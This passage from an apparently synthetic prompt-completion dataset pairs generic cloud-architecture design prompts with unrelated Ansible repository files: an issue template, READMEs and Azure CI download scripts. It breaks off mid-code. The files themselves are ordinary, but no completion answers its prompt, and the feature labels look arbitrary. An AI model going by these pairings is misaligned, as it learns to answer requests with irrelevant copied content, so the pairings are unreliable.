instead.\n\n\n      [collections org]: /ansible-collections\n    placeholder: dnf, apt, pip, user etc.\n  validations:\n    required: true\n\n- type: textarea\n  attributes:\n    label: Ansible Version\n    description: >-\n      Paste verbatim output from `ansible --version` below, under\n      the prompt line. Please don't wrap it with triple backticks — your\n      whole input will be turned into a code snippet automatically.\n    render: console\n    value: |\n      $ ansible --version\n    placeholder: |\n      $ ansible --version\n      ansible [core 2.11.0b4.post0]  (detached HEAD ref: refs/) last updated 2021/04/02 00:33:35 (GMT +200)\n        config file = None\n        configured module search path = ['~/.ansible/plugins/modules', '/usr/share/ansible/plugins/modules']\n        ansible python module location = ~/src/github/ansible/ansible/lib/ansible\n        ansible collection location = ~/.ansible/collections:/usr/share/ansible/collections\n        executable location = bin/ansible\n        python version = 3.9.0 (default, Oct 26 2020, 13:08:59) [GCC 10.2.0]\n        jinja version = 2.11.3\n        libyaml = True\n  validations:\n    required: true\n\n- type: textarea\n  attributes:\n    label: Configuration\n    description: >-\n      Paste verbatim output from `ansible-config dump --only-changed -t all` below, under the prompt line.\n      (if using a version older than ansible-core 2.12 you should omit the '-t all')\n      Please don't wrap it with triple backticks — your\n      whole input will be turned into a code snippet automatically.\n    render: console\n    value: |\n      # if using a version older than ansible-core 2.12 you should omit the '-t all'\n      $ ansible-config dump --only-changed -t all\n    placeholder: |\n      # if using a version older than ansible-core 2.12 you should omit the '-t all'\n      $ ansible-config dump --only-changed -t all\n      DEFAULT_GATHERING(~/src/github/ansible/ansible/ansible.cfg) = smart\n      DEFAULT_HOST_LIST(~/src/github/ansible/ansible/ansible.cfg) = ['~/src/github/ansible/ansible/hosts']\n      DEFAULT_VAULT_PASSWORD_FILE(~/src/github/ansible/ansible/ansible.cfg) = ~/src/github/ansible/ansible/vault/print-password.sh\n  validations:\n    required: true\n\n- type: textarea\n  attributes:\n    label: OS / Environment\n    description: >-\n      Provide all relevant information below, e.g. target OS versions,\n      network device firmware, etc.\n    placeholder: RHEL 8, CentOS Stream etc.\n  validations:\n    required: true\n\n\n- type: textarea\n  attributes:\n    label: Steps to Reproduce\n    description: |\n      Describe exactly how to reproduce the problem, using a minimal test-case. It would *really* help us understand your problem if you could also provide any playbooks, configs and commands you used.\n\n      **HINT:** You can paste https://gist.github.com links for larger files.\n    value: |\n      <!--- Paste example playbooks or commands between quotes below -->\n      ```yaml (paste below)\n\n      ```\n    placeholder: |\n      1. Implement the following playbook:\n\n         ```yaml\n         ---\n         # ping.yml\n         - hosts: all\n           gather_facts: false\n           tasks:\n           - ping:\n         ...\n         ```\n      2. Then run `ANSIBLE_DEBUG=1 ansible-playbook ping.yml -vvvvv`\n      3. An error occurs.\n  validations:\n    required: true\n\n- type: textarea\n  attributes:\n    label: Expected Results\n    description: >-\n      Describe what you expected to happen when running the steps above.\n    placeholder: >-\n      I expected X to happen because I assumed Y and was shocked\n      that it did not.\n  validations:\n    required: true\n\n- type: textarea\n  attributes:\n    label: Actual Results\n    description: |\n      Describe what actually happened. If possible run with extra verbosity (`-vvvv`).\n\n      Paste verbatim command output and don't wrap it with triple backticks — your\n      whole input will be turned into a code snippet automatically.\n    render: console\n    placeholder: >-\n      Certificate did not match expected hostname: files.pythonhosted.org. Certificate: {'notAfter': 'Apr 28 19:20:25 2021 GMT', 'subjectAltName': ((u'DNS', 'r.ssl.fastly.net'), (u'DNS', '*.catchpoint.com'), (u'DNS', '*.cnn.io'), (u'DNS', '*.dollarshaveclub.com'), (u'DNS', '*.eater.com'), (u'DNS', '*.fastly.picmonkey.com'), (u'DNS', '*.files.saymedia-content.com'), (u'DNS', '*.ft.com'), (u'DNS', '*.meetupstatic.com'), (u'DNS', '*.nfl.com'), (u'DNS', '*.pagar.me'), (u'DNS', '*.picmonkey.com'), (u'DNS', '*.realself.com'), (u'DNS', '*.sbnation.com'), (u'DNS', '*.shakr.com'), (u'DNS', '*.streamable.com'), (u'DNS', '*.surfly.com'), (u'DNS', '*.theverge.com'), (u'DNS', '*.thrillist.com'), (u'DNS', '*.vox-cdn.com'), (u'DNS', '*.vox.com'), (u'DNS', '*.voxmedia.com'), (u'DNS', 'eater.com'), (u'DNS', 'ft.com'), (u'DNS', 'i.gse.io'), (u'DNS', 'picmonkey.com'), (u'DNS', 'realself.com'), (u'DNS', 'static.wixstatic.com'), (u'DNS', 'streamable.com'), (u'DNS', 'surfly.com'), (u'DNS', 'theverge.com'), (u'DNS', 'vox-cdn.com'), (u'DNS', 'vox.com'), (u'DNS', 'www.joyent.com')), 'subject': ((('countryName', u'US'),), (('stateOrProvinceName', u'California'),), (('localityName', u'San Francisco'),), (('organizationName', u'Fastly, Inc'),), (('commonName', u'r.ssl.fastly.net'),))}\n      Exception:\n      Traceback (most recent call last):\n        File \"/usr/local/lib/python2.6/dist-packages/pip/basecommand.py\", line 215, in main\n          status = self.run(options, args)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/commands/install.py\", line 335, in run\n          wb.build(autobuilding=True)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/wheel.py\", line 749, in build\n          self.requirement_set.prepare_files(self.finder)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/req/req_set.py\", line 380, in prepare_files\n          ignore_dependencies=self.ignore_dependencies))\n        File \"/usr/local/lib/python2.6/dist-packages/pip/req/req_set.py\", line 620, in _prepare_file\n          session=self.session, hashes=hashes)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/download.py\", line 821, in unpack_url\n          hashes=hashes\n        File \"/usr/local/lib/python2.6/dist-packages/pip/download.py\", line 659, in unpack_http_url\n          hashes)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/download.py\", line 853, in _download_http_url\n          stream=True,\n        File \"/usr/local/lib/python2.6/dist-packages/pip/_vendor/requests/sessions.py\", line 521, in get\n          return self.request('GET', url, **kwargs)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/download.py\", line 386, in request\n          return super(PipSession, self).request(method, url, *args, **kwargs)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/_vendor/requests/sessions.py\", line 508, in request\n          resp = self.send(prep, **send_kwargs)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/_vendor/requests/sessions.py\", line 618, in send\n          r = adapter.send(request, **kwargs)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/_vendor/cachecontrol/adapter.py\", line 47, in send\n          resp = super(CacheControlAdapter, self).send(request, **kw)\n        File \"/usr/local/lib/python2.6/dist-packages/pip/_vendor/requests/adapters.py\", line 506, in send\n          raise SSLError(e, request=request)\n      SSLError: HTTPSConnectionPool(host='files.pythonhosted.org', port=443): Max retries exceeded with url: /packages/ef/ab/aa12712415809bf698e719b307419f953e25344e8f42d557533d7a02b276/netapp_lib-2020.7.16-py2-none-any.whl (Caused by SSLError(CertificateError(\"hostname 'files.pythonhosted.org' doesn't match either of 'r.ssl.fastly.net', '*.catchpoint.com', '*.cnn.io', '*.dollarshaveclub.com', '*.eater.com', '*.fastly.picmonkey.com', '*.files.saymedia-content.com', '*.ft.com', '*.meetupstatic.com', '*.nfl.com', '*.pagar.me', '*.picmonkey.com', '*.realself.com', '*.sbnation.com', '*.shakr.com', '*.streamable.com', '*.surfly.com', '*.theverge.com', '*.thrillist.com', '*.vox-cdn.com', '*.vox.com', '*.voxmedia.com', 'eater.com', 'ft.com', 'i.gse.io', 'picmonkey.com', 'realself.com', 'static.wixstatic.com', 'streamable.com', 'surfly.com', 'theverge.com', 'vox-cdn.com', 'vox.com', 'www.joyent.com'\",),))\n      ERROR: Command \"/usr/bin/python2.6 /root/ansible/test/lib/ansible_test/_data/quiet_pip.py install --disable-pip-version-check -r /root/ansible/test/lib/ansible_test/_data/requirements/units.txt -r tests/unit/requirements.txt -c /root/ansible/test/lib/ansible_test/_data/requirements/constraints.txt\" returned exit status 2.\n      ERROR: Command \"docker exec d47eb360db4ce779c1f690db964655b76e68895c4360ff252c46fe7fe6f5c75a /usr/bin/env ANSIBLE_TEST_CONTENT_ROOT=/root/ansible_collections/netapp/ontap LC_ALL=en_US.UTF-8 /usr/bin/python3.6 /root/ansible/bin/ansible-test units --metadata tests/output/.tmp/metadata-9i2qfrcl.json --truncate 200 --redact --color yes --requirements --python default --requirements-mode only\" returned exit status 1.\n  validations:\n    required: true\n\n\n- type: markdown\n  attributes:\n    value: >\n      *One last thing...*\n\n\n      *Please, complete **all** sections as described, this form\n      is [processed automatically by a robot][ansibot help].*\n\n\n      Thank you for your collaboration!\n\n\n      [ansibot help]:\n      /ansible/ansibotmini#ansibotmini\n\n\n- type: checkboxes\n  attributes:\n    label: Code of Conduct\n    description: |\n      Read the [Ansible Code of Conduct][CoC] first.\n\n      [CoC]: https://docs.ansible.com/ansible/devel/community/code_of_conduct.html?utm_medium=github&utm_source=issue_form--bug_report.yml\n    options:\n    - label: I agree to follow the Ansible Code of Conduct\n      required: true\n...\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": ".github/ISSUE_TEMPLATE/bug_report.yml", "language": "yaml", "complexity": "complex", "star_count": 65718, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 251}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "[![PyPI version](https://img.shields.io/pypi/v/ansible-core.svg)](https://pypi.org/project/ansible-core)\n[![Docs badge](https://img.shields.io/badge/docs-latest-brightgreen.svg)](https://docs.ansible.com/ansible/latest/)\n[![Chat badge](https://img.shields.io/badge/chat-IRC-brightgreen.svg)](https://docs.ansible.com/ansible/devel/community/communication.html)\n[![Build Status](https://dev.azure.com/ansible/ansible/_apis/build/status/CI?branchName=devel)](https://dev.azure.com/ansible/ansible/_build/latest?definitionId=20&branchName=devel)\n[![Ansible Code of Conduct](https://img.shields.io/badge/code%20of%20conduct-Ansible-silver.svg)](https://docs.ansible.com/ansible/devel/community/code_of_conduct.html)\n[![Ansible mailing lists](https://img.shields.io/badge/mailing%20lists-Ansible-orange.svg)](https://docs.ansible.com/ansible/devel/community/communication.html#mailing-list-information)\n[![Repository License](https://img.shields.io/badge/license-GPL%20v3.0-brightgreen.svg)](COPYING)\n[![Ansible CII Best Practices certification](https://bestpractices.coreinfrastructure.org/projects/2372/badge)](https://bestpractices.coreinfrastructure.org/projects/2372)\n\n# Ansible\n\nAnsible is a radically simple IT automation system. It handles\nconfiguration management, application deployment, cloud provisioning,\nad-hoc task execution, network automation, and multi-node orchestration. Ansible makes complex\nchanges like zero-downtime rolling updates with load balancers easy. More information on the Ansible [website](https://ansible.com/).\n\n## Design Principles\n\n* Have an extremely simple setup process with a minimal learning curve.\n* Manage machines quickly and in parallel.\n* Avoid custom-agents and additional open ports, be agentless by\n  leveraging the existing SSH daemon.\n* Describe infrastructure in a language that is both machine and human\n  friendly.\n* Focus on security and easy auditability/review/rewriting of content.\n* Manage new remote machines instantly, without bootstrapping any\n  software.\n* Allow module development in any dynamic language, not just Python.\n* Be usable as non-root.\n* Be the easiest IT automation system to use, ever.\n\n## Use Ansible\n\nYou can install a released version of Ansible with `pip` or a package manager. See our\n[installation guide](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) for details on installing Ansible\non a variety of platforms.\n\nPower users and developers can run the `devel` branch, which has the latest\nfeatures and fixes, directly. Although it is reasonably stable, you are more likely to encounter\nbreaking changes when running the `devel` branch. We recommend getting involved\nin the Ansible community if you want to run the `devel` branch.\n\n## Communication\n\nJoin the Ansible forum to ask questions, get help, and interact with the\ncommunity.\n\n* [Get Help](https://forum.ansible.com/c/help/6): Find help or share your Ansible knowledge to help others.\n  Use tags to filter and subscribe to posts, such as the following:\n  * Posts tagged with [ansible](https://forum.ansible.com/tag/ansible)\n  * Posts tagged with [ansible-core](https://forum.ansible.com/tag/ansible-core)\n  * Posts tagged with [playbook](https://forum.ansible.com/tag/playbook)\n* [Social Spaces](https://forum.ansible.com/c/chat/4): Meet and interact with fellow enthusiasts.\n* [News & Announcements](https://forum.ansible.com/c/news/5): Track project-wide announcements including social events.\n* [Bullhorn newsletter](https://docs.ansible.com/ansible/devel/community/communication.html#the-bullhorn): Get release announcements and important changes.\n\nFor more ways to get in touch, see [Communicating with the Ansible community](https://docs.ansible.com/ansible/devel/community/communication.html).\n\n## Contribute to Ansible\n\n* Check out the [Contributor's Guide](./.github/CONTRIBUTING.md).\n* Read [Community Information](https://docs.ansible.com/ansible/devel/community) for all\n  kinds of ways to contribute to and interact with the project,\n  including how to submit bug reports and code to Ansible.\n* Submit a proposed code update through a pull request to the `devel` branch.\n* Talk to us before making larger changes\n  to avoid duplicate efforts. This not only helps everyone\n  know what is going on, but it also helps save time and effort if we decide\n  some changes are needed.\n\n## Coding Guidelines\n\nWe document our Coding Guidelines in the [Developer Guide](https://docs.ansible.com/ansible/devel/dev_guide/). We particularly suggest you review:\n\n* [Contributing your module to Ansible](https://docs.ansible.com/ansible/devel/dev_guide/developing_modules_checklist.html)\n* [Conventions, tips, and pitfalls](https://docs.ansible.com/ansible/devel/dev_guide/developing_modules_best_practices.html)\n\n## Branch Info\n\n* The `devel` branch corresponds to the release actively under development.\n* The `stable-2.X` branches correspond to stable releases.\n* Create a branch based on `devel` and set up a [dev environment](https://docs.ansible.com/ansible/devel/dev_guide/developing_modules_general.html#common-environment-setup) if you want to open a PR.\n* See the [Ansible release and maintenance](https://docs.ansible.com/ansible/devel/reference_appendices/release_and_maintenance.html) page for information about active branches.\n\n## Roadmap\n\nBased on team and community feedback, an initial roadmap will be published for a major or minor version (ex: 2.7, 2.8).\nThe [Ansible Roadmap page](https://docs.ansible.com/ansible/devel/roadmap/) details what is planned and how to influence the roadmap.\n\n## Authors\n\nAnsible was created by [Michael DeHaan](https://github.com/mpdehaan)\nand has contributions from over 5000 users (and growing). Thanks everyone!\n\n[Ansible](https://www.ansible.com) is sponsored by [Red Hat, Inc.](https://www.redhat.com)\n\n## License\n\nGNU General Public License v3.0 or later\n\nSee [COPYING](COPYING) to see the full text.\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 65718, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 102}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Azure Pipelines Scripts\n\n## Scripts\n\nThis directory contains the following scripts:\n\n- download.py - Download results from CI.\n- get_recent_coverage_runs.py - Retrieve CI URLs of recent coverage test runs.\n- incidental.py - Report on incidental code coverage using data from CI.\n- run.py - Start new runs on CI.\n\n## Incidental Code Coverage\n\n### Background\n\nIncidental testing and code coverage occurs when a test covers one or more portions of code as an unintentional side-effect of testing another portion of code.\n\nFor example, the ``dnf`` integration test intentionally tests the ``dnf`` Ansible module.\nHowever, in doing so it also uses, and unintentionally tests the ``file`` module as well.\n\nAs part of the process of migrating modules and plugins into collections, integration tests were identified that provided exclusive incidental code coverage.\nThat is, tests which would be migrated out of the repository which covered code which would not be covered by any remaining tests.\n\nThese integration test targets were preserved as incidental tests with the ``incidental_`` prefix prior to migration.\nThe plugins necessary to support these tests were also preserved in the ``test/support/`` directory.\n\nThe long-term goal for these incidental tests is to replace them with tests that intentionally cover the relevant code.\nAs additional intentional tests are added, the exclusive coverage provided by incidental tests will decline, permitting them to be removed without loss of test coverage.\n\n### Reducing Incidental Coverage\n\nReducing incidental test coverage, and eventually removing incidental tests involves the following process:\n\n1. Run the entire test suite with code coverage enabled.\n   This is done automatically each day on Azure Pipelines.\n   The URLs and statuses of the most recent such test runs can be found with:\n\n   ```shell\n   hacking/azp/get_recent_coverage_runs.py <optional branch name>\n   ```\n\n   The branch name defaults to `devel`.\n2. Download code coverage data from Azure Pipelines for local analysis.\n   Example:\n\n   ```shell\n   # download results to ansible/ansible directory under cwd\n   # substitute the correct run number for the Azure Pipelines coverage run you want to download\n   hacking/azp/download.py 14075 --artifacts --run-metadata -v\n   ```\n\n3. Analyze code coverage data to see which portions of the code are covered by each test.\n   Example:\n\n   ```shell\n   # make sure ansible-test is in $PATH\n   source hacking/env-setup\n   # run the script using whichever directory results were downloaded into\n   hacking/azp/incidental.py 14075/\n   ```\n\n4. Create new intentional tests, or extend existing ones, to cover code that is currently covered by incidental tests.\n   Reports are created by default in a ``test/results/.tmp/incidental/{hash}/reports/`` directory.\n   The ``{hash}`` value is based on the input files used to generate the report.\n\nOver time, as the above process is repeated, exclusive incidental code coverage will decline.\nWhen incidental tests no longer provide exclusive coverage they can be removed.\n\n> CAUTION: Only one incidental test should be removed at a time, as doing so may cause another test to gain exclusive incidental coverage.\n\n#### Incidental Plugin Coverage\n\nIncidental test coverage is not limited to ``incidental_`` prefixed tests.\nFor example, incomplete code coverage from a filter plugin's own tests may be covered by an unrelated test.\nThe ``incidental.py`` script can be used to identify these gaps as well.\n\nFollow the steps 1 and 2 as outlined in the previous section.\nFor step 3, add the ``--plugin-path {path_to_plugin}`` option.\nRepeat step 3 for as many plugins as desired.\n\nTo report on multiple plugins at once, such as all ``filter`` plugins, the following command can be used:\n\n```shell\nfind lib/ansible/plugins/filter -name '*.py' -not -name __init__.py -exec hacking/azp/incidental.py 14075/ --plugin-path '{}' ';'\n```\n\nEach report will show the incidental code coverage missing from the plugin's own tests.\n\n> NOTE: The report does not identify where the incidental coverage comes from.\n\n### Reading Incidental Coverage Reports\n\nEach line of code covered will be included in a report.\nThe left column contains the line number where the source occurs.\nIf the coverage is for Python code a comment on the right side will indicate the coverage arcs involved.\n\nBelow is an example of a report:\n\n```text\nTarget: incidental_win_psexec\nGitHub: https://github.com/ansible/ansible/blob/6994ef0b554a816f02e0771cb14341a421f7cead/test/integration/targets/incidental_win_psexec\n\nSource: lib/ansible/executor/task_executor.py (2 arcs, 3/1141 lines):\nGitHub: https://github.com/ansible/ansible/blob/6994ef0b554a816f02e0771cb14341a421f7cead/lib/ansible/executor/task_executor.py\n\n 705                  if 'rc' in result and result['rc'] not in [0, \"0\"]:  ### (here) -> 706\n 706                      result['failed'] = True  ### 705 -> (here)  ### (here) -> 711\n\n 711              if self._task.until:  ### 706 -> (here)\n```\n\nThe report indicates the test target responsible for the coverage and provides a link to the source on GitHub using the appropriate commit to match the code coverage.\n\nEach file covered in the report indicates the lines affected, and in the case of Python code, arcs.\nA link to the source file on GitHub using the appropriate commit is also included.\n\nThe left column includes the line number for the source code found to the right.\nIn the case of Python files, the rightmost comment indicates the coverage arcs involved.\n\n``### (here) -> 706`` for source line 705 indicates that execution flowed from line 705 to line 706.\nMultiple outbound line numbers can be present.\n\n``### 706 -> (here)`` for source line 711 indicates that execution flowed from line 706 to line 711.\nMultiple inbound line numbers can be present.\n\nIn both cases ``(here)`` is simply a reference to the current source line.\n\nArcs are only available for Python code.\nPowerShell code only reports covered line numbers.\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "hacking/azp/README.md", "language": "markdown", "complexity": "medium", "star_count": 65718, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 130}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# PYTHON_ARGCOMPLETE_OK\n\n# (c) 2016 Red Hat, Inc.\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\"\"\"CLI tool for downloading results from Azure Pipelines CI runs.\"\"\"\n\nfrom __future__ import annotations\n\n# noinspection PyCompatibility\nimport argparse\nimport json\nimport os\nimport re\nimport io\nimport zipfile\n\nimport requests\n\ntry:\n    import argcomplete\nexcept ImportError:\n    argcomplete = None\n\n# Following changes should be made to improve the overall style:\n# TODO use new style formatting method.\n# TODO use requests session.\n# TODO type hints.\n# TODO pathlib.\n\n\ndef main():\n    \"\"\"Main program body.\"\"\"\n\n    args = parse_args()\n    download_run(args)\n\n\ndef run_id_arg(arg):\n    m = re.fullmatch(r\"(?:https:\\/\\/dev\\.azure\\.com\\/ansible\\/ansible\\/_build\\/results\\?buildId=)?(\\d+)\", arg)\n    if not m:\n        raise ValueError(\"run does not seems to be a URI or an ID\")\n    return m.group(1)\n\n\ndef parse_args():\n    \"\"\"Parse and return args.\"\"\"\n\n    parser = argparse.ArgumentParser(description='Download results from a CI run.')\n\n    parser.add_argument('run', metavar='RUN', type=run_id_arg, help='AZP run id or URI')\n\n    parser.add_argument('-v', '--verbose',\n                        dest='verbose',\n                        action='store_true',\n                        help='show what is being downloaded')\n\n    parser.add_argument('-t', '--test',\n                        dest='test',\n                        action='store_true',\n                        help='show what would be downloaded without downloading')\n\n    parser.add_argument('-p', '--pipeline-id', type=int, default=20, help='pipeline to download the job from')\n\n    parser.add_argument('--artifacts',\n                        action='store_true',\n                        help='download artifacts')\n\n    parser.add_argument('--console-logs',\n                        action='store_true',\n                        help='download console logs')\n\n    parser.add_argument('--run-metadata',\n                        action='store_true',\n                        help='download run metadata')\n\n    parser.add_argument('--all',\n                        action='store_true',\n                        help='download everything')\n\n    parser.add_argument('--match-artifact-name',\n                        default=re.compile('.*'),\n                        type=re.compile,\n                        help='only download artifacts which names match this regex')\n\n    parser.add_argument('--match-job-name',\n                        default=re.compile('.*'),\n                        type=re.compile,\n                        help='only download artifacts from jobs which names match this regex')\n\n    if argcomplete:\n        argcomplete.autocomplete(parser)\n\n    args = parser.parse_args()\n\n    if args.all:\n        args.artifacts = True\n        args.run_metadata = True\n        args.console_logs = True\n\n    selections = (\n        args.artifacts,\n        args.run_metadata,\n        args.console_logs\n    )\n\n    if not any(selections):\n        parser.error('At least one download option is required.')\n\n    return args\n\n\ndef download_run(args):\n    \"\"\"Download a run.\"\"\"\n\n    output_dir = '%s' % args.run\n\n    if not args.test and not os.path.exists(output_dir):\n        os.makedirs(output_dir)\n\n    if args.run_metadata:\n        run_url = 'https://dev.azure.com/ansible/ansible/_apis/pipelines/%s/runs/%s?api-version=6.0-preview.1' % (args.pipeline_id, args.run)\n        run_info_response = requests.get(run_url)\n        run_info_response.raise_for_status()\n        run = run_info_response.json()\n\n        path = os.path.join(output_dir, 'run.json')\n        contents = json.dumps(run, sort_keys=True, indent=4)\n\n        if args.verbose:\n            print(path)\n\n        if not args.test:\n            with open(path, 'w') as metadata_fd:\n                metadata_fd.write(contents)\n\n    timeline_response = requests.get('https://dev.azure.com/ansible/ansible/_apis/build/builds/%s/timeline?api-version=6.0' % args.run)\n    timeline_response.raise_for_status()\n    timeline = timeline_response.json()\n    roots = set()\n    by_id = {}\n    children_of = {}\n    parent_of = {}\n    for r in timeline['records']:\n        thisId = r['id']\n        parentId = r['parentId']\n\n        by_id[thisId] = r\n\n        if parentId is None:\n            roots.add(thisId)\n        else:\n            parent_of[thisId] = parentId\n            children_of[parentId] = children_of.get(parentId, []) + [thisId]\n\n    allowed = set()\n\n    def allow_recursive(ei):\n        allowed.add(ei)\n        for ci in children_of.get(ei, []):\n            allow_recursive(ci)\n\n    for ri in roots:\n        r = by_id[ri]\n        allowed.add(ri)\n        for ci in children_of.get(r['id'], []):\n            c = by_id[ci]\n            if not args.match_job_name.match(\"%s %s\" % (r['name'], c['name'])):\n                continue\n            allow_recursive(c['id'])\n\n    if args.artifacts:\n        artifact_list_url = 'https://dev.azure.com/ansible/ansible/_apis/build/builds/%s/artifacts?api-version=6.0' % args.run\n        artifact_list_response = requests.get(artifact_list_url)\n        artifact_list_response.raise_for_status()\n        for artifact in artifact_list_response.json()['value']:\n            if artifact['source'] not in allowed or not args.match_artifact_name.match(artifact['name']):\n                continue\n            if args.verbose:\n                print('%s/%s' % (output_dir, artifact['name']))\n            if not args.test:\n                response = requests.get(artifact['resource']['downloadUrl'])\n                response.raise_for_status()\n                archive = zipfile.ZipFile(io.BytesIO(response.content))\n                archive.extractall(path=output_dir)\n\n    if args.console_logs:\n        for r in timeline['records']:\n            if not r['log'] or r['id'] not in allowed or not args.match_artifact_name.match(r['name']):\n                continue\n            names = []\n            parent_id = r['id']\n            while parent_id is not None:\n                p = by_id[parent_id]\n                name = p['name']\n                if name not in names:\n                    names = [name] + names\n                parent_id = parent_of.get(p['id'], None)\n\n            path = \" \".join(names)\n\n            # Some job names have the separator in them.\n            path = path.replace(os.sep, '_')\n\n            log_path = os.path.join(output_dir, '%s.log' % path)\n            if args.verbose:\n                print(log_path)\n            if not args.test:\n                log = requests.get(r['log']['url'])\n                log.raise_for_status()\n                open(log_path, 'wb').write(log.content)\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": "hacking/azp/download.py", "language": "python", "complexity": "complex", "star_count": 65718, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 230}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\n# (c) 2020 Red Hat, Inc.\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nfrom __future__ import annotations\n\nfrom ansible.utils.color import stringc\nimport requests\nimport sys\nimport datetime\n\n# Following changes should be made to improve the overall style:\n# TODO use argparse for arguments.\n# TODO use new style formatting method.\n# TODO use requests session.\n# TODO type hints.\n\nBRANCH = 'devel'\nPIPELINE_ID = 20\nMAX_AGE = datetime.timedelta(hours=24)\n\nif len(sys.argv) > 1:\n    BRANCH = sys.argv[1]\n\n\ndef get_coverage_runs():\n    list_response = requests.get(\"https://dev.azure.com/ansible/ansible/_apis/pipelines/%s/runs?api-version=6.0-preview.1\" % PIPELINE_ID)\n    list_response.raise_for_status()\n\n    runs = list_response.json()\n\n    coverage_runs = []\n    for run_summary in runs[\"value\"][0:1000]:\n        run_response = requests.get(run_summary['url'])\n\n        if run_response.status_code == 500 and 'Cannot serialize type Microsoft.Azure.Pipelines.WebApi.ContainerResource' in run_response.json()['message']:\n            # This run used a container resource, which AZP can no longer serialize for anonymous requests.\n            # Assume all older requests have this issue as well and stop further processing of runs.\n            # The issue was reported here: https://developercommunity.visualstudio.com/t/Pipelines-API-serialization-error-for-an/10294532\n            # A work-around for this issue was applied in: https://github.com/ansible/ansible/pull/80299\n            break\n\n        run_response.raise_for_status()\n        run = run_response.json()\n\n        if run['resources']['repositories']['self']['refName'] != 'refs/heads/%s' % BRANCH:\n            continue\n\n        if 'finishedDate' in run_summary:\n            age = datetime.datetime.now() - datetime.datetime.strptime(run['finishedDate'].split(\".\")[0], \"%Y-%m-%dT%H:%M:%S\")\n            if age > MAX_AGE:\n                break\n\n        artifact_response = requests.get(\"https://dev.azure.com/ansible/ansible/_apis/build/builds/%s/artifacts?api-version=6.0\" % run['id'])\n        artifact_response.raise_for_status()\n\n        artifacts = artifact_response.json()['value']\n        if any(a[\"name\"].startswith(\"Coverage\") for a in artifacts):\n            # TODO wrongfully skipped if all jobs failed.\n            coverage_runs.append(run)\n\n    return coverage_runs\n\n\ndef pretty_coverage_runs(runs):\n    ended = []\n    in_progress = []\n    for run in runs:\n        if run.get('finishedDate'):\n            ended.append(run)\n        else:\n            in_progress.append(run)\n\n    for run in sorted(ended, key=lambda x: x['finishedDate']):\n        if run['result'] == \"succeeded\":\n            print('🙂 [%s] https://dev.azure.com/ansible/ansible/_build/results?buildId=%s (%s)' % (\n                stringc('PASS', 'green'),\n                